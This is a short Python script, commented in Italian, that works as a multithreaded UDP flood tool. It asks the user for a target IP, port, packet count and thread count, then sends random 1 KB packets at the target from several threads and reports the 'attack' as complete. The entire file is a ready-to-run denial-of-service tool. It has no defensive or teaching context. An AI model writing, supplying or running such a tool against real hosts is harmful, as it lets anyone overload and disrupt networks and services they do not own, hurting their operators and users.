import socket
import random
import threading
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def udp_flood(target_ip, target_port, num_packets):
    udp_socket = None
    try:
        # Creazione del socket UDP
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Generazione di 1KB di dati casuali
        data = bytearray(random.getrandbits(8) for _ in range(1024))

        # Invio dei pacchetti verso il target
        for _ in range(num_packets):
            udp_socket.sendto(data, (target_ip, target_port))

        print(f"{Fore.GREEN}Attacco UDP flood completato con successo.{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}Si è verificato un errore durante l'attacco UDP flood: {e}{Style.RESET_ALL}")

    finally:
        # Chiusura del UDP socket
        if udp_socket:
            udp_socket.close()

def main():
    try:
        # Input dell'IP e della porta target
        target_ip = input("Inserisci l'IP target: ")
        target_port = int(input("Inserisci la porta target: "))

        # Input dei numero di pacchetti da inviare
        num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
        
        # Input del numero di threads con il quale si vogliono inviare i pacchetti
        num_threads = int(input("Inserisci il numero di threads con cui inviarli: "))

        # Controllo sugli input
        if num_packets <= 0 or num_threads <= 0:
            raise ValueError("Inserisci un valore numerico valido.")

        # Creazione e inizio del thread
        threads = []
        packets_per_thread = num_packets // num_threads
        for _ in range(num_threads):
            thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, packets_per_thread))
            threads.append(thread)
            thread.start()

        # Si aspetta che tutti i thread finiscano
        for thread in threads:
            thread.join()

    except ValueError as e:
        print(f"{Fore.RED}Errore input: {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
